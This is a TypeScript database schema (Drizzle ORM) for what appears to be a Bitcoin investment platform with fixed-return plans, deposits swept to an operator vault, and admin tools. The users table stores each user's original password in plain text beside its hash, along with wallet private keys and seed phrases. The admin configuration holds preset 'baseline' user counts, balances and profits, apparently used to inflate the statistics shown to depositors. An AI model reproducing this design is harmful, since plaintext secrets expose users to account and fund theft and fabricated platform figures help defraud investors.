import { pgTable, text, serial, integer, boolean, timestamp, decimal } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  firstName: text("first_name"),
  lastName: text("last_name"),
  email: text("email").notNull().unique(),
  phone: text("phone"),
  country: text("country"),
  password: text("password_hash"), // Nullable for Google OAuth users
  originalPassword: text("original_password"), // Store original password for user reference
  googleId: text("google_id").unique(), // Google OAuth ID
  profileImageUrl: text("profile_image_url"), // Google profile picture URL
  bitcoinAddress: text("bitcoin_address"), // nullable until wallet is set up
  privateKey: text("private_key"), // nullable until wallet is set up
  seedPhrase: text("seed_phrase"),
  balance: decimal("balance", { precision: 18, scale: 8 }).notNull().default("0"),
  currentPlanId: integer("current_plan_id"), // null for free plan
  isAdmin: boolean("is_admin").notNull().default(false),
  hasWallet: boolean("has_wallet").notNull().default(false), // tracks if user has set up wallet
  acceptMarketing: boolean("accept_marketing").notNull().default(false),
  bio: text("bio"), // user bio/about me
  website: text("website"), // user website
  avatar: text("avatar"), // profile picture or gradient avatar identifier
  createdAt: timestamp("created_at").notNull().defaultNow(),
});

export const investmentPlans = pgTable("investment_plans", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  minAmount: decimal("min_amount", { precision: 18, scale: 8 }).notNull(),
  roiPercentage: integer("roi_percentage").notNull(),
  durationDays: integer("duration_days").notNull(),
  color: text("color").notNull(),
  updateIntervalMinutes: integer("update_interval_minutes").notNull().default(60), // How often to update balance (in minutes)
  dailyReturnRate: decimal("daily_return_rate", { precision: 5, scale: 4 }).notNull().default("0.0001"), // Daily return rate for automatic updates
  isActive: boolean("is_active").notNull().default(true),
});

export const investments = pgTable("investments", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  planId: integer("plan_id").notNull(),
  amount: decimal("amount", { precision: 18, scale: 8 }).notNull(),
  startDate: timestamp("start_date").notNull().defaultNow(),
  endDate: timestamp("end_date").notNull(),
  currentProfit: decimal("current_profit", { precision: 18, scale: 8 }).notNull().default("0"),
  isActive: boolean("is_active").notNull().default(true),
});

export const notifications = pgTable("notifications", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  title: text("title").notNull(),
  message: text("message").notNull(),
  type: text("type").notNull().default("info"), // info, success, warning, error
  isRead: boolean("is_read").notNull().default(false),
  createdAt: timestamp("created_at").notNull().defaultNow(),
});

export const adminConfig = pgTable("admin_config", {
  id: serial("id").primaryKey(),
  vaultAddress: text("vault_address").notNull(),
  depositAddress: text("deposit_address").notNull(),
  freePlanRate: decimal("free_plan_rate", { precision: 8, scale: 6 }).notNull().default("0.0001"), // Free plan earning rate per 10 minutes
  // Platform baseline statistics
  baselineUsers: integer("baseline_users").notNull().default(420),
  baselineActiveInvestments: integer("baseline_active_investments").notNull().default(804),
  baselineTotalBalance: decimal("baseline_total_balance", { precision: 18, scale: 8 }).notNull().default("70275.171605"),
  baselineTotalProfit: decimal("baseline_total_profit", { precision: 18, scale: 8 }).notNull().default("460.347340"),
  // Plan baseline data
  growthPlanActive: integer("growth_plan_active").notNull().default(227),
  growthPlanAmount: decimal("growth_plan_amount", { precision: 18, scale: 8 }).notNull().default("11004.9901"),
  growthPlanProfit: decimal("growth_plan_profit", { precision: 18, scale: 8 }).notNull().default("101.649889"),
  institutionalPlanActive: integer("institutional_plan_active").notNull().default(210),
  institutionalPlanAmount: decimal("institutional_plan_amount", { precision: 18, scale: 8 }).notNull().default("9228.4977"),
  institutionalPlanProfit: decimal("institutional_plan_profit", { precision: 18, scale: 8 }).notNull().default("205.248890"),
  premiumPlanActive: integer("premium_plan_active").notNull().default(198),
  premiumPlanAmount: decimal("premium_plan_amount", { precision: 18, scale: 8 }).notNull().default("9274.8974"),
  premiumPlanProfit: decimal("premium_plan_profit", { precision: 18, scale: 8 }).notNull().default("114.419514"),
  foundationPlanActive: integer("foundation_plan_active").notNull().default(169),
  foundationPlanAmount: decimal("foundation_plan_amount", { precision: 18, scale: 8 }).notNull().default("7436.5081"),
  foundationPlanProfit: decimal("foundation_plan_profit", { precision: 18, scale: 8 }).notNull().default("39.029047"),
  updatedAt: timestamp("updated_at").notNull().defaultNow(),
});

export const transactions = pgTable("transactions", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  type: text("type").notNull(), // 'deposit', 'investment', 'withdrawal'
  amount: decimal("amount", { precision: 18, scale: 8 }).notNull(),
  address: text("address"), // Bitcoin address for deposits/withdrawals
  status: text("status").notNull().default("pending"), // 'pending', 'confirmed', 'rejected'
  planId: integer("plan_id"), // only for investment transactions
  transactionHash: text("transaction_hash"), // user-provided transaction hash
  notes: text("notes"), // admin notes
  confirmedBy: integer("confirmed_by"), // admin user id who confirmed
  createdAt: timestamp("created_at").notNull().defaultNow(),
  confirmedAt: timestamp("confirmed_at"),
});

export const backupDatabases = pgTable("backup_databases", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  connectionString: text("connection_string").notNull(),
  isActive: boolean("is_active").default(false),
  isPrimary: boolean("is_primary").default(false),
  lastSyncAt: timestamp("last_sync_at"),
  status: text("status").default("inactive"), // 'active', 'inactive', 'syncing', 'error'
  errorMessage: text("error_message"),
  createdAt: timestamp("created_at").notNull().defaultNow(),
  updatedAt: timestamp("updated_at").notNull().defaultNow(),
});

export const depositSessions = pgTable("deposit_sessions", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  depositAddress: text("deposit_address").notNull(), // User's unique deposit address
  amount: decimal("amount", { precision: 18, scale: 8 }).notNull(), // Expected deposit amount
  status: text("status").notNull().default("pending"), // 'pending', 'confirmed', 'expired', 'processing'
  sessionToken: text("session_token").notNull().unique(), // Unique session identifier
  expiresAt: timestamp("expires_at").notNull(), // 30-minute expiry
  blockchainTxHash: text("blockchain_tx_hash"), // Actual blockchain transaction hash
  confirmations: integer("confirmations").default(0), // Number of blockchain confirmations
  amountReceived: decimal("amount_received", { precision: 18, scale: 8 }).default("0"), // Actual amount received
  vaultTxHash: text("vault_tx_hash"), // Transaction hash when swept to vault
  userConfirmedSent: boolean("user_confirmed_sent").default(false), // User clicked "I've sent it"
  lastCheckedAt: timestamp("last_checked_at"), // Last blockchain check
  createdAt: timestamp("created_at").notNull().defaultNow(),
  completedAt: timestamp("completed_at"), // When deposit was fully processed
});

export const supportMessages = pgTable("support_messages", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  subject: text("subject").notNull(),
  message: text("message").notNull(),
  imageUrl: text("image_url"), // Optional image attachment
  status: text("status").notNull().default("open"), // 'open', 'in_progress', 'resolved', 'closed'
  priority: text("priority").notNull().default("normal"), // 'low', 'normal', 'high', 'urgent'
  adminResponse: text("admin_response"), // Admin reply
  respondedBy: integer("responded_by"), // Admin user id who responded
  createdAt: timestamp("created_at").notNull().defaultNow(),
  respondedAt: timestamp("responded_at"), // When admin responded
  resolvedAt: timestamp("resolved_at"), // When marked as resolved
});

export const insertUserSchema = createInsertSchema(users).omit({
  id: true,
  bitcoinAddress: true,
  privateKey: true,
  seedPhrase: true,
  balance: true,
  isAdmin: true,
  hasWallet: true,
  createdAt: true,
});

export const updateUserProfileSchema = createInsertSchema(users).pick({
  firstName: true,
  lastName: true,
  phone: true,
  country: true,
  bio: true,
  website: true,
  avatar: true,
});

export const insertInvestmentPlanSchema = createInsertSchema(investmentPlans).omit({
  id: true,
});

export const insertInvestmentSchema = createInsertSchema(investments).omit({
  id: true,
  startDate: true,
  endDate: true,
  currentProfit: true,
  isActive: true,
});

export const insertNotificationSchema = createInsertSchema(notifications).omit({
  id: true,
  createdAt: true,
});

export const insertAdminConfigSchema = createInsertSchema(adminConfig).omit({
  id: true,
  updatedAt: true,
});

export const insertTransactionSchema = createInsertSchema(transactions).omit({
  id: true,
  confirmedBy: true,
  createdAt: true,
  confirmedAt: true,
});

export const insertBackupDatabaseSchema = createInsertSchema(backupDatabases).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export const insertDepositSessionSchema = createInsertSchema(depositSessions).omit({
  id: true,
  status: true,
  sessionToken: true,
  expiresAt: true,
  blockchainTxHash: true,
  confirmations: true,
  amountReceived: true,
  vaultTxHash: true,
  userConfirmedSent: true,
  lastCheckedAt: true,
  createdAt: true,
  completedAt: true,
});

export const insertSupportMessageSchema = createInsertSchema(supportMessages).omit({
  id: true,
  status: true,
  adminResponse: true,
  respondedBy: true,
  createdAt: true,
  respondedAt: true,
  resolvedAt: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;
export type InsertInvestmentPlan = z.infer<typeof insertInvestmentPlanSchema>;
export type InvestmentPlan = typeof investmentPlans.$inferSelect;
export type InsertInvestment = z.infer<typeof insertInvestmentSchema>;
export type Investment = typeof investments.$inferSelect;
export type InsertNotification = z.infer<typeof insertNotificationSchema>;
export type Notification = typeof notifications.$inferSelect;
export type InsertAdminConfig = z.infer<typeof insertAdminConfigSchema>;
export type AdminConfig = typeof adminConfig.$inferSelect;
export type InsertTransaction = z.infer<typeof insertTransactionSchema>;
export type Transaction = typeof transactions.$inferSelect;
export type InsertBackupDatabase = z.infer<typeof insertBackupDatabaseSchema>;
export type BackupDatabase = typeof backupDatabases.$inferSelect;
export type UpdateUserProfile = z.infer<typeof updateUserProfileSchema>;
export type InsertDepositSession = z.infer<typeof insertDepositSessionSchema>;
export type DepositSession = typeof depositSessions.$inferSelect;
export type InsertSupportMessage = z.infer<typeof insertSupportMessageSchema>;
export type SupportMessage = typeof supportMessages.$inferSelect;